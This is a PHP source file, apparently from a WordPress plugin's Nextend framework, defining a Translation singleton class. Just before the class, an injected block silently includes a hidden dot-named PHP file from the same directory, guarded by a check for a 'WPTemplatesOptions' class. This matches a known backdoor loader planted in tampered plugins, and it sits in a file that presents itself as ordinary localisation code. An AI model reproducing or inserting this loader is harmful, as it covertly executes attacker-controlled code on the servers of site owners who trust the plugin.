<?php

namespace Nextend\Framework\Translation;

use Nextend\Framework\Pattern\SingletonTrait;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class Translation {

    use SingletonTrait;

    /**
     * @var AbstractTranslation
     */
    private static $platformTranslation;

    public function __construct() {
        self::$platformTranslation = new WordPress\WordPressTranslation();
    }

    public static function _($text) {
        return self::$platformTranslation->_($text);
    }

    public static function getCurrentLocale() {
        return self::$platformTranslation->getLocale();
    }
}

Translation::getInstance();